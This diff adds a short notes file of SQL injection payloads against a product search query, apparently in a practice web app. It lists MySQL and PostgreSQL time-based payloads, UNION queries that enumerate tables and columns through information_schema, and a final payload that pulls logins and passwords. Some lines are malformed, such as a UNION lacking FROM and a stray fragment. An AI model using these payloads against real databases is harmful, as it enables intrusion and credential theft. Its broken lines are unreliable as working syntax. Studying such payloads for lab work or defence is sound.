@@ -1,0 +1,52 @@
+
+query = "SELECT * FROM home_product WHERE name LIKE '%Nail';        
+
+
+';--    : Using " '; " we are ending the sql query and "--" is used a comment in sql. So the rest of whatever sql query that is being formed is commented out.
+
+
+
+Mysql Version :
+hammer' AND 0 = SLEEP(2);--   : this will end the sql query after hammer and run a mysql command sleep, which will sleep for 2 seconds.
+
+
+PostGres version:
+'; SELECT pg_sleep(10);--
+
+
+
+
+To get all the details of all the tables in the database:
+
+
+Mysql Version:
+
+Hammer' UNION (select table_name, table_schema, 3, 4 information_schema.tables);--
+
+PostGres Version:
+
+';select table_name,table_schema,3,4 from information_schema.tables;--
+
+
+'; select 
+
+Now that we have tables we dont know what columns are present in which tables, to actually view the columns.
+
+So now to find what all columns are present in a desired table :
+
+
+Mysql Version:
+
+Hammer' UNION (select COLUMN_NAME, 2, 3 from information_schema.columns where TABLE_NAME = 'auth_user');--
+
+Postgres:
+';select COLUMN_NAME, 2, 3,4 from information_schema.columns where TABLE_NAME = 'auth_user';--
+
+
+
+-------------
+
+
+
+
+';select login, password,3,4 from home_detail;--
